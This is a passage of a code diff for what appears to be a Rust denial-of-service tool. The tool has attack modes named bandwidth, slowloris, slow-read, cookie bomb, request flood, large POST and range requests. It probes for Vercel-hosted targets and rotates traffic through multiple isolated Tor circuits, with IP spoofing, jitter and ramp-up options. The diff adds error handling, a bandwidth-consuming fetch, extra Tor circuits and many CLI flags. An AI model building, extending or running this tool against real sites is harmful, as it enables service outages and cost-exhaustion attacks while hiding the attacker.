+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    // Read the full body to actually consume bandwidth
+                    let bytes = resp.bytes().await?.len();
+                    if verbose {
+                        println!("  [BANDWIDTH] Got {} bytes (HTTP {})", bytes, status);
+                    }
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    if attempt == 2 {
+                        last_err = Some(e);
+                    }
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_bandwidth: all attempts exhausted"),
+    }
 }
 
 struct LatencySamples {
@@ -778,6 +1140,7 @@ struct AppState {
     validated: u32, validation_total: u32, target_url: String,
     attack_mode: AttackMode, max_scrape: usize, load_concurrency: usize,
     interval_ms: u64, jitter_ms: u64, tcp_concurrency: usize,
+    rate_limit: Option<u64>,
     validate_concurrency: usize, validate_timeout_secs: u64,
     probe_status: String, has_image_opt: bool, has_api: bool, has_middleware: bool,
     is_vercel: bool, vercel_plan: String,
@@ -787,6 +1150,7 @@ struct AppState {
     client_config: ClientConfig,
     custom_selector: Option<String>,
     tor_proxy: Option<String>,
+    verbose: bool,
 }
 
 impl AppState {
@@ -798,6 +1162,7 @@ impl AppState {
         validated: 0, validation_total: 0, target_url: DEFAULT_TARGET_URL.to_string(),
         attack_mode: AttackMode::Normal, max_scrape: 100_000, load_concurrency: 20,
         interval_ms: 10, jitter_ms: 50, tcp_concurrency: 500,
+        rate_limit: None,
         validate_concurrency: 500, validate_timeout_secs: 1,
         probe_status: "Not probed".to_string(), has_image_opt: false, has_api: false,
         has_middleware: false, is_vercel: false, vercel_plan: String::new(),
@@ -807,6 +1172,7 @@ impl AppState {
         client_config: ClientConfig::default(),
         custom_selector: None,
         tor_proxy: None,
+        verbose: false,
     }}
 }
 
@@ -834,7 +1200,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
         None
     };
 
-    let mut builder = browser_client_builder(&config)
+    let mut builder = browser_client_builder(&config).redirect(reqwest::redirect::Policy::limited(config.max_redirects))
         .timeout(Duration::from_secs(5))
         .danger_accept_invalid_certs(true);
     if let Some(ref p) = effective_tor_proxy {
@@ -842,7 +1208,10 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
             builder = builder.proxy(proxy_val);
         }
     }
-    let c = builder.build().expect("failed to build client");
+    let c = builder.build().unwrap_or_else(|e| {
+        eprintln!("  Failed to build HTTP client: {}", e);
+        std::process::exit(1);
+    });
 
     let base = target_url.trim_end_matches('/');
     let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
@@ -926,10 +1295,16 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     if !html.is_empty() {
         let doc = Html::parse_document(&html);
         for sel in & [("link[href]", "href"), ("script[src]", "src"), ("img[src]", "src")] {
-            let s = Selector::parse(sel.0).expect("invalid selector");
+            let s = Selector::parse(sel.0).unwrap_or_else(|e| {
+                eprintln!("  Failed to parse selector '{}': {}", sel.0, e);
+                std::process::exit(1);
+            });
             for el in doc.select(&s) { if let Some(v) = el.value().attr(sel.1) { let j = url_join(base, v); if !j.is_empty() { statics.push(j); } } }
         }
-        let src_sel = Selector::parse("source[srcset]").expect("invalid selector");
+        let src_sel = Selector::parse("source[srcset]").unwrap_or_else(|e| {
+            eprintln!("  Failed to parse selector 'source[srcset]': {}", e);
+            std::process::exit(1);
+        });
         for el in doc.select(&src_sel) {
             if let Some(srcset) = el.value().attr("srcset") {
                 let first = srcset.split(',').next().unwrap_or("").split_whitespace().next().unwrap_or("");
@@ -954,7 +1329,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
             let mut is_img = false;
             let mut is_img_opt = false;
             let mut is_ok = false;
-            if let Ok(r) = browser_request(c_clone.get(&path_clone)).send().await {
+            if let Ok(r) = browser_request(c_clone.get(&path_clone), false).send().await {
                 if r.status().as_u16() < 400 {
                     let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
                     if sz > 0 {
@@ -963,7 +1338,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
                         if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
                             is_img = true;
                             if vercel_clone {
-                                if let Ok(r2) = browser_request(c_clone.get(format!("{}?width=300", path_clone))).send().await {
+                                if let Ok(r2) = browser_request(c_clone.get(format!("{}?width=300", path_clone)), false).send().await {
                                     let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
                                     if sz2 > 0 && sz2 != sz {
                                         is_img_opt = true;
@@ -998,7 +1373,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
         let c_clone = c.clone();
         let url = format!("{}{}", base, path);
         api_handles.push(tokio::spawn(async move {
-            if let Ok(r) = browser_request(c_clone.get(&url)).send().await {
+            if let Ok(r) = browser_request(c_clone.get(&url), false).send().await {
                 if r.status().as_u16() < 400 {
                     return Some(path.to_string());
                 }
@@ -1163,18 +1538,25 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
         ProxyMode::Tor => {
             state.lock().await.status_msg = "Checking Tor...".to_string();
             let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
+            let n_unique = 3usize;
             if ok {
                 state.lock().await.status_msg = "Tor ready".to_string();
-                let proxies = vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()];
+                let mut proxies = Vec::with_capacity(n_unique);
+                for i in 0..n_unique {
+                    proxies.push(format!("socks5h://tor{}:isolate@127.0.0.1:9050", i));
+                }
                 // Warm up circuits with HEAD to actual target
-                state.lock().await.status_msg = "Warming Tor circuits...".to_string();
+                state.lock().await.status_msg = format!("Warming {} Tor circuits...", n_unique);
                 warm_tor_circuits(&proxies, &target_url, 20, 2).await;
                 Some(proxies)
             } else if let Ok(custom) = std::env::var("TOR_PROXY") {
                 let base = custom.trim_end_matches('?').trim_end_matches('/');
                 let base = if let Some(pos) = base.find('@') { &base[pos+1..] } else { base };
                 state.lock().await.status_msg = format!("Using TOR_PROXY: {}", base);
-                let proxies = vec![format!("socks5h://tor:isolate@{}", base)];
+                let mut proxies = Vec::with_capacity(n_unique);
+                for i in 0..n_unique {
+                    proxies.push(format!("socks5h://tor{}:isolate@{}", i, base));
+                }
                 warm_tor_circuits(&proxies, &target_url, 20, 2).await;
                 Some(proxies)
             } else {
@@ -1191,7 +1573,7 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
             } else {
                 None
             };
-            let mut builder = browser_client_builder(&config).timeout(Duration::from_secs(15));
+            let mut builder = browser_client_builder(&config).redirect(reqwest::redirect::Policy::limited(config.max_redirects)).timeout(Duration::from_secs(15));
             if let Some(ref p) = effective_tor_proxy {
                 if let Ok(proxy_val) = reqwest::Proxy::all(p) {
                     builder = builder.proxy(proxy_val);
@@ -1239,9 +1621,9 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
 }
 
 async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
-    let (mut conc, interval, attack, sessions, _, apis, _statics) = {
+    let (mut conc, interval, attack, sessions, _, apis, _statics, rate_limit, verbose) = {
         let st = state.lock().await;
-        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone())
+        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone(), st.rate_limit, st.verbose)
     };
     let mut jitter_ms;
     let mut semaphore = Arc::new(Semaphore::new(conc));
@@ -1288,9 +1670,21 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
             }
             
             let _permit = match semaphore.clone().acquire_owned().await { Ok(p) => p, Err(_) => return, };
-            let next_client = {
-                let mut p_lock = pool.lock().expect("pool lock poisoned");
-                p_lock.next()
+            
+            // Rate limiting: if rate_limit is Some(n), enforce max requests per second
+            if let Some(rate) = rate_limit {
+                if rate > 0 {
+                    let interval_ms = 1000 / rate;
+                    tokio::time::sleep(Duration::from_millis(interval_ms)).await;
+                }
+            }
+            
+            let next_client = match pool.lock() {
+                Ok(mut guard) => guard.next(),
+                Err(e) => {
+                    eprintln!("  Pool lock poisoned: {}", e);
+                    continue;
+                }
             };
             if let Some((idx, client)) = next_client {
                 let stats_clone = stats.clone();
@@ -1314,7 +1708,7 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                 }
 
                 let permit_clone = _permit;
-                let _ = tokio::spawn(async move {
+                tokio::spawn(async move {
                     let _permit = permit_clone;
                     let start_req = Instant::now();
                     
@@ -1338,46 +1732,49 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                     };
 
                     let result = match attack {
-                        AttackMode::Bandwidth | AttackMode::Normal => {
-                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone()).await
+                        AttackMode::Bandwidth => {
+                            fetch_bandwidth(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
+                        }
+                        AttackMode::Normal => {
+                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::SlowRead => {
-                            fetch_slow(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
+                            fetch_slow(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::ImageOpt => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                         }
                         AttackMode::LargePost => {
-                            fetch_post(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
+                            fetch_post(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::AssetSpray => {
-                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone()).await
+                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::RangeReq => {
-                            if assets.is_empty() { fetch_range(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_range(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                         }
                         AttackMode::CookieBomb => {
-                            fetch_cookie(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
+                            fetch_cookie(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::Ssr => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                         }
                         AttackMode::Middleware => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                         }
                         AttackMode::RequestFlood => {
-                            fetch_page(client, target.clone(), 0, 0, idx, sessions_clone.clone()).await
+                            fetch_page(client, target.clone(), 0, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::NotFound => {
                             let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
-                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, 0, idx, sessions_clone.clone()).await
+                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::Slowloris => {
-                            fetch_slowloris(client, target.clone(), req_delay, idx, sessions_clone.clone()).await
+                            fetch_slowloris(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                     };
                     let latency = start_req.elapsed().as_millis() as u64;
@@ -1395,7 +1792,12 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                                 500..=599 => { stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed); }
                                 _ => { stats_clone.status_other.fetch_add(1, Ordering::Relaxed); }
                             }
-                            pool_clone.lock().unwrap().report_success(idx, latency);
+                            match pool_clone.lock() {
+                                Ok(mut guard) => guard.report_success(idx, latency),
+                                Err(e) => {
+                                    eprintln!("  Pool lock poisoned: {}", e);
+                                }
+                            }
                         }
                         Err(err) => {
                             if err.is_timeout() {
@@ -1406,7 +1808,12 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                                 stats_clone.error_other.fetch_add(1, Ordering::Relaxed);
                             }
                             stats_clone.errors.fetch_add(1, Ordering::Relaxed);
-                            pool_clone.lock().unwrap().report_failure(idx);
+                            match pool_clone.lock() {
+                                Ok(mut guard) => guard.report_failure(idx),
+                                Err(e) => {
+                                    eprintln!("  Pool lock poisoned: {}", e);
+                                }
+                            }
                         }
                     }
                 });
@@ -1424,17 +1831,34 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
 fn write_probe_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str) {
     let status_escaped = status.replace(',', ";");
     let content = format!("target,status,proxy_count,concurrency,attack_mode\n{},{},{},{},{}\n", target, status_escaped, proxies.len(), concurrency, attack);
-    std::fs::write(path, content).unwrap();
-    println!("  CSV written to {}", path);
+    if let Err(e) = std::fs::write(path, content) {
+        eprintln!("  Failed to write CSV to {}: {}", path, e);
+    } else {
+        println!("  CSV written to {}", path);
+    }
 }
 
-fn write_results_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str, total_reqs: u64, total_bytes: u64, duration: u64) {
-    let status_escaped = status.replace(',', ";");
-    let content = format!("target,status,proxy_count,concurrency,attack_mode,total_requests,total_bytes,duration_sec,kb_per_sec\n{},{},{},{},{},{},{},{}{:.2}\n",
-        target, status_escaped, proxies.len(), concurrency, attack,
-        total_reqs, total_bytes, duration, total_bytes as f64 / duration as f64 / 1024.0);
-    std::fs::write(path, content).unwrap();
-    println!("  CSV written to {}", path);
+struct ResultsCsvParams<'a> {
+    target: &'a str,
+    status: &'a str,
+    proxies: &'a [String],
+    concurrency: usize,
+    attack: &'a str,
+    total_reqs: u64,
+    total_bytes: u64,
+    duration: u64,
+}
+
+fn write_results_csv(path: &str, params: ResultsCsvParams<'_>) {
+    let status_escaped = params.status.replace(',', ";");
+    let content = format!("target,status,proxy_count,concurrency,attack_mode,total_requests,total_bytes,duration_sec,kb_per_sec\n{},{},{},{},{},{},{},{},{:.2}\n",
+        params.target, status_escaped, params.proxies.len(), params.concurrency, params.attack,
+        params.total_reqs, params.total_bytes, params.duration, params.total_bytes as f64 / params.duration as f64 / 1024.0);
+    if let Err(e) = std::fs::write(path, content) {
+        eprintln!("  Failed to write CSV to {}: {}", path, e);
+    } else {
+        println!("  CSV written to {}", path);
+    }
 }
 
 /// Resolve a Tor control address to a connection target.
@@ -1471,15 +1895,26 @@ fn read_control_cookie(_socket_path: &str) -> Option<String> {
         "/var/lib/tor/control_auth_cookie",
         "/home/tor/.config/tor/auth_cookie",
         "/run/tor/control_auth_cookie",
+        "/run/tor/control.authcookie",
         "/var/run/tor/control_auth_cookie",
+        "/var/run/tor/control.authcookie",
         "/home/tor/.local/share/tor/control_auth_cookie",
     ];
     for p in &cookie_paths {
         if let Ok(bytes) = std::fs::read(p) {
-            // Cookie is hex-encoded bytes, skip first 2 bytes (length prefix)
+            // Cookie is hex-encoded bytes; most modern Tor installs write 32 raw bytes
+            // (no length prefix). Older formats had a 2-byte length prefix — try both.
             if bytes.len() > 2 {
+                // Try without length prefix first (modern format)
+                let hex_str: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
+                if hex_str.len() == 64 {
+                    return Some(hex_str);
+                }
+                // Fall back: try skipping 2-byte length prefix
                 let hex_str: String = bytes[2..].iter().map(|b| format!("{:02x}", b)).collect();
-                return Some(hex_str);
+                if hex_str.len() == 64 {
+                    return Some(hex_str);
+                }
             }
         }
     }
@@ -1632,26 +2067,8 @@ async fn listen_stdin(state: Arc<Mutex<AppState>>) {
                             }
                         }
                         "attack" => {
-                            let mode = match val {
-                                "bandwidth" => Some(AttackMode::Bandwidth),
-                                "slowread" => Some(AttackMode::SlowRead),
-                                "imageopt" => Some(AttackMode::ImageOpt),
-                                "largepost" => Some(AttackMode::LargePost),
-                                "assetspray" => Some(AttackMode::AssetSpray),
-                                "rangereq" => Some(AttackMode::RangeReq),
-                                "cookiebomb" => Some(AttackMode::CookieBomb),
-                                "ssr" => Some(AttackMode::Ssr),
-                                "middleware" => Some(AttackMode::Middleware),
-                                "requestflood" => Some(AttackMode::RequestFlood),
-                                "notfound" => Some(AttackMode::NotFound),
-                                "slowloris" => Some(AttackMode::Slowloris),
-                                "normal" => Some(AttackMode::Normal),
-                                _ => None,
-                            };
-                            if let Some(m) = mode {
-                                st.attack_mode = m;
-                                println!("  [System] Dynamic attack mode updated to {}", m);
-                            }
+                            st.attack_mode = AttackMode::from_str(val);
+                            println!("  [System] Dynamic attack mode updated to {}", st.attack_mode);
                         }
                         "target" | "target_url" => {
                             st.target_url = val.to_string();
@@ -1688,11 +2105,60 @@ async fn resolve_target_dns(target_url: &str) -> Option<std::net::IpAddr> {
     if host.contains("localhost") || host.contains("127.0.0.1") || host.ends_with(".onion") {
         return None;
     }
-    let addrs = tokio::net::lookup_host(format!("{}:443", host)).await.ok()?;
-    for addr in addrs {
-        return Some(addr.ip());
+    let mut addrs = tokio::net::lookup_host(format!("{}:443", host)).await.ok()?;
+    addrs.next().map(|addr| addr.ip())
+}
+
+fn format_time_now() -> String {
+    use std::time::{SystemTime, UNIX_EPOCH};
+    let secs = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    let days = secs / 86400;
+    let remainder = secs % 86400;
+    let hours = remainder / 3600;
+    let minutes = (remainder % 3600) / 60;
+    let seconds = remainder % 60;
+    // Simple date from days since epoch (1970-01-01)
+    let mut d = days;
+    let mut year = 1970u32;
+    while d >= 365u64 {
+        let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100)) || year.is_multiple_of(400);
+        let yd = if leap { 366 } else { 365 };
+        if d < yd as u64 { break; }
+        d -= yd as u64;
+        year += 1;
     }
-    None
+    // Simple month/day from day-of-year
+    let months = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+    let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100)) || year.is_multiple_of(400);
+    let mut month = 1u32;
+    let mut day = d + 1;
+    for m in &months {
+        let mut ml = *m as u64;
+        if month == 2 && leap { ml += 1; }
+        if day <= ml { break; }
+        day -= ml;
+        month += 1;
+    }
+    format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", year, month, day, hours, minutes, seconds)
+}
+
+/// Gradually increases concurrency from 1 to `target` over `ramp_up_secs` seconds.
+/// Each tick sleeps for `(ramp_up_secs / target)` seconds, then increments concurrency.
+async fn ramp_up_concurrency(state: Arc<Mutex<AppState>>, target: usize, ramp_up_secs: u64) {
+    if ramp_up_secs == 0 || target <= 1 { return; }
+    let tick_ms = (ramp_up_secs as f64 / target as f64 * 1000.0).max(200.0) as u64;
+    println!("  Ramping up concurrency: 1 → {} over {}s (tick = {}ms)", target, ramp_up_secs, tick_ms);
+    for c in 2..=target {
+        tokio::time::sleep(Duration::from_millis(tick_ms)).await;
+        let mut st = state.lock().await;
+        st.load_concurrency = c;
+        st.stats.concurrency.store(c, Ordering::Relaxed);
+        println!("  Ramp-up: concurrency = {}", c);
+    }
+    println!("  Ramp-up complete: reached concurrency = {}", target);
 }
 
 #[tokio::main]
@@ -1711,6 +2177,7 @@ async fn main() {
     let mut delay_ms: u64 = 0;
     let mut max_errors: Option<u64> = None;
     let mut config_file: Option<String> = None;
+    let mut custom_headers: Vec<String> = Vec::new();
     let mut positional: Vec<String> = Vec::new();
 
     // New configuration variables
@@ -1723,10 +2190,24 @@ async fn main() {
     let mut tor_circuit_timeout: Option<u64> = None;
     let mut tor_ssthresh = 20usize;
     let mut sni: Option<String> = None;
+    let mut user_agent: Option<String> = None;
     let mut jitter_ms = 0u64;
     let mut auto_tune = false;
     let mut tui = false;
+    let mut insecure = false;
     let mut spoof_ip = false;
+    let mut quiet = false;
+    let mut json_output = false;
+    let mut verbose = false;
+    let mut rate_limit: Option<u64> = None;
+    let mut max_redirects: usize = 10;
+    let mut rotation_strategy = String::from("weighted");  // weighted, round-robin, random
+    let mut log_file: Option<String> = None;
+    let mut canary = false;
+    let mut report_file: Option<String> = None;
+    let mut stats_interval_secs: u64 = 5;
+    let mut tor_circuits: usize = 10;
+    let mut ramp_up_secs: u64 = 0;
 
     let mut args_iter = args.into_iter().skip(1);
     while let Some(arg) = args_iter.next() {
@@ -1775,6 +2256,11 @@ async fn main() {
                     config_file = Some(val);
                 }
             }
+            "--custom-header" => {
+                if let Some(val) = args_iter.next() {
+                    custom_headers.push(val);
+                }
+            }
             "--custom-selector" => {
                 if let Some(val) = args_iter.next() {
                     custom_selector = Some(val);
@@ -1820,6 +2306,11 @@ async fn main() {
                     sni = Some(val);
                 }
             }
+            "--user-agent" => {
+                if let Some(val) = args_iter.next() {
+                    user_agent = Some(val);
+                }
+            }
             "--jitter" => {
                 if let Some(val) = args_iter.next() {
                     jitter_ms = val.parse().unwrap_or(0);
@@ -1827,48 +2318,133 @@ async fn main() {
             }
             "--auto-tune" => auto_tune = true,
             "--tui" => tui = true,
+            "--insecure" => insecure = true,
             "--spoof-ip" => spoof_ip = true,
+            "--quiet" => quiet = true,
+            "--verbose" => verbose = true,
+            "--json" => json_output = true,
+            "--rate" => {
+                if let Some(val) = args_iter.next() {
+                    rate_limit = val.parse().ok();
+                }
+            }
+            "--max-redirects" => {
+                if let Some(val) = args_iter.next() {
+                    max_redirects = val.parse().unwrap_or(10);
+                }
+            }
+            "--rotation-strategy" => {
+                if let Some(val) = args_iter.next() {
+                    if val == "round-robin" || val == "random" || val == "weighted" {
+                        rotation_strategy = val.to_string();
+                    }
+                }
+            }
+            "--log-file" => {
+                if let Some(val) = args_iter.next() {
+                    log_file = Some(val);
+                }
+            }
+            "--canary" => canary = true,
+            "--report" => {
+                if let Some(val) = args_iter.next() {
+                    report_file = Some(val);
+                }
+            }
+            "--stats-interval" => {
+                if let Some(val) = args_iter.next() {
+                    stats_interval_secs = val.parse().unwrap_or(5);
+                }
+            }
+            "--tor-circuits" => {
+                if let Some(val) = args_iter.next() {
+                    tor_circuits = val.parse().unwrap_or(10);
+                }
+            }
+            "--ramp-up" => {
+                if let Some(val) = args_iter.next() {
+                    ramp_up_secs = val.parse().unwrap_or(0);
+                }
+            }
+            "--body" => {
+                if let Some(val) = args_iter.next() {
+                    let _ = CUSTOM_POST_BODY.set(val);
+                }
+            }
+            "--content-type" => {
+                if let Some(val) = args_iter.next() {
+                    let _ = CUSTOM_CONTENT_TYPE.set(val);
+                }
+            }
             other => {
                 if other.starts_with("--output=") {
-                    output_csv = Some(other.strip_prefix("--output=").unwrap().to_string());
+                    output_csv = Some(other.strip_prefix("--output=").unwrap_or("").to_string());
                 } else if other.starts_with("--proxy-file=") {
-                    proxy_file = Some(other.strip_prefix("--proxy-file=").unwrap().to_string());
+                    proxy_file = Some(other.strip_prefix("--proxy-file=").unwrap_or("").to_string());
                 } else if other.starts_with("--tor-proxy=") {
-                    tor_proxy = Some(other.strip_prefix("--tor-proxy=").unwrap().to_string());
+                    tor_proxy = Some(other.strip_prefix("--tor-proxy=").unwrap_or("").to_string());
                 } else if other.starts_with("--delay=") {
-                    delay_ms = other.strip_prefix("--delay=").unwrap().parse().unwrap_or(0);
+                    delay_ms = other.strip_prefix("--delay=").unwrap_or("").parse().unwrap_or(0);
                 } else if other.starts_with("--max-errors=") {
-                    max_errors = other.strip_prefix("--max-errors=").unwrap().parse().ok();
+                    max_errors = other.strip_prefix("--max-errors=").unwrap_or("").parse().ok();
                 } else if other.starts_with("--save-proxies=") {
-                    save_proxies = Some(other.strip_prefix("--save-proxies=").unwrap().to_string());
+                    save_proxies = Some(other.strip_prefix("--save-proxies=").unwrap_or("").to_string());
                 } else if other.starts_with("--config=") {
-                    config_file = Some(other.strip_prefix("--config=").unwrap().to_string());
+                    config_file = Some(other.strip_prefix("--config=").unwrap_or("").to_string());
                 } else if other.starts_with("--custom-selector=") {
-                    custom_selector = Some(other.strip_prefix("--custom-selector=").unwrap().to_string());
+                    custom_selector = Some(other.strip_prefix("--custom-selector=").unwrap_or("").to_string());
                 } else if other.starts_with("--pool-max-idle=") {
-                    pool_max_idle = other.strip_prefix("--pool-max-idle=").unwrap().parse().unwrap_or(20);
+                    pool_max_idle = other.strip_prefix("--pool-max-idle=").unwrap_or("").parse().unwrap_or(20);
                 } else if other.starts_with("--pool-idle-timeout=") {
-                    pool_idle_timeout_secs = other.strip_prefix("--pool-idle-timeout=").unwrap().parse().unwrap_or(90);
+                    pool_idle_timeout_secs = other.strip_prefix("--pool-idle-timeout=").unwrap_or("").parse().unwrap_or(90);
                 } else if other.starts_with("--tor-control=") {
-                    tor_control = other.strip_prefix("--tor-control=").unwrap().to_string();
+                    tor_control = other.strip_prefix("--tor-control=").unwrap_or("").to_string();
                 } else if other.starts_with("--tor-entry-guards=") {
-                    tor_entry_guards = Some(other.strip_prefix("--tor-entry-guards=").unwrap().to_string());
+                    tor_entry_guards = Some(other.strip_prefix("--tor-entry-guards=").unwrap_or("").to_string());
                 } else if other.starts_with("--tor-bridges=") {
-                    tor_bridges = Some(other.strip_prefix("--tor-bridges=").unwrap().to_string());
+                    tor_bridges = Some(other.strip_prefix("--tor-bridges=").unwrap_or("").to_string());
                 } else if other.starts_with("--tor-circuit-timeout=") {
-                    tor_circuit_timeout = other.strip_prefix("--tor-circuit-timeout=").unwrap().parse().ok();
+                    tor_circuit_timeout = other.strip_prefix("--tor-circuit-timeout=").unwrap_or("").parse().ok();
                 } else if other.starts_with("--tor-ssthresh=") {
-                    tor_ssthresh = other.strip_prefix("--tor-ssthresh=").unwrap().parse().unwrap_or(20);
+                    tor_ssthresh = other.strip_prefix("--tor-ssthresh=").unwrap_or("").parse().unwrap_or(20);
+                } else if other.starts_with("--report=") {
+                    report_file = Some(other.strip_prefix("--report=").unwrap_or("").to_string());
                 } else if other.starts_with("--sni=") {
-                    sni = Some(other.strip_prefix("--sni=").unwrap().to_string());
+                    sni = Some(other.strip_prefix("--sni=").unwrap_or("").to_string());
                 } else if other.starts_with("--jitter=") {
-                    jitter_ms = other.strip_prefix("--jitter=").unwrap().parse().unwrap_or(0);
+                    jitter_ms = other.strip_prefix("--jitter=").unwrap_or("").parse().unwrap_or(0);
                 } else if other == "--auto-tune" {
                     auto_tune = true;
                 } else if other == "--tui" {
                     tui = true;
                 } else if other == "--spoof-ip" {
                     spoof_ip = true;
+                } else if other == "--quiet" {
+                    quiet = true;
+                } else if other == "--json" {
+                    json_output = true;
+                } else if other == "--canary" {
+                    canary = true;
+                } else if other.starts_with("--rate=") {
+                    rate_limit = other.strip_prefix("--rate=").unwrap_or("").parse().ok();
+                } else if other.starts_with("--max-redirects=") {
+                    max_redirects = other.strip_prefix("--max-redirects=").unwrap_or("").parse().unwrap_or(10);
+                } else if other.starts_with("--rotation-strategy=") {
+                    rotation_strategy = other.strip_prefix("--rotation-strategy=").unwrap_or("").to_string();
+                } else if other.starts_with("--log-file=") {
+                    log_file = Some(other.strip_prefix("--log-file=").unwrap_or("").to_string());
+                } else if other.starts_with("--stats-interval=") {
+                    stats_interval_secs = other.strip_prefix("--stats-interval=").unwrap_or("").parse().unwrap_or(5);
+                } else if other.starts_with("--tor-circuits=") {
+                    tor_circuits = other.strip_prefix("--tor-circuits=").unwrap_or("").parse().unwrap_or(10);
+                } else if other.starts_with("--ramp-up=") {
+                    ramp_up_secs = other.strip_prefix("--ramp-up=").unwrap_or("").parse().unwrap_or(0);
+                } else if other.starts_with("--body=") {
+                    let val = other.strip_prefix("--body=").unwrap_or("").to_string();
+                    let _ = CUSTOM_POST_BODY.set(val);
+                } else if other.starts_with("--content-type=") {
+                    let val = other.strip_prefix("--content-type=").unwrap_or("").to_string();
